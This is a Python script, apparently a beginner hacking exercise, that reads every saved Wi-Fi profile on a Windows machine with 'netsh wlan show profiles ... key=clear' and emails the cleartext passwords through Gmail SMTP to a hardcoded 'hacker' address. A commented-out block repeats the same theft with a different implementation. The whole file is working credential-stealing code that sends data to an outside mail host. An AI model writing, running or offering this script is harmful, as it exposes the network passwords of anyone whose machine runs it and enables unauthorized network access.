#!/usr/bin/env python

import subprocess
import smtplib
import re


def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


def capture_wifi_passwords():
    """
    :return: returns all the wifi passwords on the computer that this script executed on
    """
    # with regular expression to steal the passwords and more steps for learning

    command = f'netsh wlan show profiles"'
    result = subprocess.check_output(command, shell=True).decode("utf-8")
    wifi_names = re.findall(r'Profile\s*:\s(.*)', result)
    passwords = ""
    for wifi_name in wifi_names:
        wifi_name = wifi_name[:-1]
        command = f'netsh wlan show profiles name="{wifi_name}" key="clear"'
        passwords = passwords + subprocess.check_output(command).decode("utf-8")

    # create a subject for the email that will be sent
    subject = 'Subject : Wifi_Passwords'
    combine_subject_message = subject + passwords
    return combine_subject_message


wifi_passwords = capture_wifi_passwords()
send_mail("hacker.test.email333@gmail.com", "Hacker333", wifi_passwords)


# def get_wifi_passwords():
#     """
#     :return: returns all the wifi passwords on the computer that this script executed on
#     """
#     # using expert level string and list formatting with a splash of some slick one-liners
#     data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode("utf-8").split("\n")
#     profiles = [wifi_name.split(":")[1][1:-1] for wifi_name in data if "All User Profile" in wifi_name]
#     password_command = ""
#     for ssid in profiles:
#         netsh_wlan = f'netsh wlan show profiles name="{ssid}" key="clear"'
#         password_command = password_command + subprocess.check_output(netsh_wlan).decode("utf-8")
#
#     return password_command
#
#
# def send_mail(email, password, message):
#     server = smtplib.SMTP("smtp.gmail.com", 587)
#     server.starttls()
#     server.login(email, password)
#     server.sendmail(email, email, message)
#     server.quit()
#
#
# passwords = get_wifi_passwords()
# send_mail("hacker.test.email333@gmail.com", "Hacker333", passwords)